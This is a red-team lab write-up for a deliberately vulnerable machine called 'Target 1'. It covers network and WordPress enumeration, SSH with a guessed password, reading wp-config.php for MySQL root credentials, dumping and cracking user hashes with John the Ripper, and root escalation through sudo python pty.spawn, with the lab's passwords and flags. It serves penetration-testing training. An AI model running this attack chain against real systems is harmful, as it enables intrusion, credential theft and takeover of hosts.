# Red Team: Summary of Operations

## Table of Contents

**Target 1:**
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services
Netdiscover results identifying the IP addresses of target on the network:

netdicover -r 192.168.1.255/16

![Netdiscover](./Day 1/netdiscover.png)

Nmap scan results for Target 1 reveal the below services and OS details:

Name of the machine: Target 1
Operating system: Linux
Purpose: Defensive Blue Team
IP address: 192.168.1.110
Command used: nmap -sV 192.168.1.110

![nmap -sV 192.168.1.110](./Day 1/nmap_-sV_192_168_1_110.png)

This scan identifies the services below as potential points of entry:
- Target 1
  - Port 22/tcp open ssh (OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
  - Port 80/tcp open http (Apache httpd 2.4.10 ((Debian)))
  - Port 111/tcp open rpcbind (2-4 (RPC #100000))
  - Port 139/tcp open netbios-ssn (Samba smbd 3.X -4.X)
  - Port 445/tcp open netbios-ssn 9Samba smbd 3.X - 4.X)

The following vulnerabilities were identified on each target:
- Target 1
  - [CVE-2021-28041 open SSH](https://nvd.nist.gov/vuln/detail/CVE-2021-28041)
  - [CVE-2017-15710 Apache https 2.4.10](https://nvd.nist.gov/vuln/detail/CVE-2017-15710)
  - [CVE-2017-8779 exploit on open rpcbind port could lead to remove DoS](https://nvd.nist.gov/vuln/detail/CVE-2017-8779)
  - [CVE-2017-7494 Samba NetBIOS](https://nvd.nist.gov/vuln/detail/CVE-2017-7494)
  
  - Vulnerabilities:
The following vulnerabilities were identified on Target 1:

1. Network Mapping and User Enumeration (WordPress site)
- Nmap was used to discover open ports.
- Able to discover open ports and tailor their attacks accordingly.

2. Weak User Password
- A user had a weak password and the attackers were able to discover it by guessing.
- Able to correctly guess a user's password and SSH into the web server.

3. Unsalted User Password Hash (WordPress database)
- Wpscan was utilized by attackers in order to gain username information.
- The username info was used by the attackers to help gain access to the web server.

4. MySQL Database Access
- The attackers were able to discover a file containing login information for the MySQL database.
- Able to use the login information to gain access to the MySQL database.

5. MySQL Data Exfiltration
- By browsing through the various tables in the MySQL database the attackers were able to discover password hashes of all the users.
- The attackers were able to exfiltrate the password hashes and crack them with John the Ripper.

6. Misconfiguration of User Privileges/Privilege Escalation
- The attackers noticed that Steven had sudo privileges for python.
- Able to utilize Steven’s python privileges in order to escalate to root.

### Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - Enumerated WordPress site Users with WPScan to obtain username michael, used SSH to get user shell.
  - Command used: wpscan --url http://192.168.1.110/wordpress -eu
![wpsscan.png](./Day 1/wpsscan.png)
  
 - Visited the IP address of the target 192.168.1.110 over http port 80.
![Webpage.png](./Day 1/webpage-port-80.png)
 
 **Flag 1**
 - Flag 1: flag 1{b9bbcb33e11b80be759c4e844862482d}
![flag 1](./Day 1/flag1.png)
 **Exploit used:**
 - ssh into Michael's account and look for /var/www/files
 - Command used: ssh michael@192.168.1.110
 - The username and password for Michael are the same, which is michael, allowing for the ssh connection. 
![ssh Michael](./Day 1/ssh-michael.png)
 - Command used: cd /var/www
 - Command used: ls
 - Command used: grep -RE flag html
 - flag1 was part of the long print out.
![long print out](./Day 1/flag1-long-version.png)
 -Visited the IP address of the traget 192.168.1.110
 
**Flag 2**
 - Flag 2: flag2{fc3fd58dcdad9ab23faca6e9a36e581c}
![Flag 2](./Day 1/flag2.png)
**Exploit used:**
 - Command used: ssh into Michael's account and look in the /var/www files
 - Command used: cd /var/www
 - Command used: ls -lah
 - Command used: cat flag2.txt
![Flag 2](./Day 1/flag2.png)

**Flag 3**
 - Flag 3: flag3{afc01ab56b50591e7dccf93122770cd2}
 **Exploit used:**
 - Continued using michael shell to find the MySQL database password, logged into MySQL database, and found Flag 3 in wp_posts table.
 - Command used: cd /var/www/html/wordpress/
 - Command used: cat /var/www/html/wordpress/wp-config.php
![wp-config](./Day 1/wp-config.png)
![wp-config](./Day 1/continuation-of-wp-config.png)
![wp-config](./Day 1/mysql-database.png)
 - Used the credentials to log into MySQL and dump WordPress user password hashes as below:
DB_NAME: wordpress
DB_USER: root
DB_PASSWORD: R@v3nSecurity
 - Command: mysql -u root -p
![mysql -u root -p](./Day 1/mysql-uroot-p.png)
 - Searched MySQL database for Flag 3 and WordPress user password hashes.
Flag 3 found in wp_posts.
Password hashes found in wp_users.
 - Command used: show databases;
 - Command: use wordpress;
 - Command: show tables;
 - Command: select * from wp_posts;
 - Both flags, flag 3 and flag 4 were part of the wp_post.
![wp post](./Day 1/wp-post.png)
 - Command used: select * from wp_users
![wp users](./Day 1/wp-users.png)

**Flag 4**
- Flag 4: flag4{715dea6c055b9fe3337544932f2941ce}
**Exploit used:**
- Used john to crack the password hash obtained from MySQL database, secured a new user shell as Steven, escalated to root.
- Cracking the password hash with john.
- Copied password hash from MySQL into ~/root/wp_hashes.txt and cracked with john to discover Steven’s password is pink84.
- Command used: john wp_hashes.txt
![john](./Day 1/john.png)
- Secure a user shell as the user whose password you cracked.
- Command used: ssh steven@192.168.1.110
* Password: pink84
- Escalating to root
- Command used: sudo -l
![sudo -l](./Day 1/sudo-l.png)
- sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’
![sudo -l](./Day 1/sudo-l.png)
- Searched for the root directory for Flag 4.
- Command used: cd /root/
- Command used: ls
- Command used: cat flag4.txt
![sudo -l](./Day 1/sudo-l.png)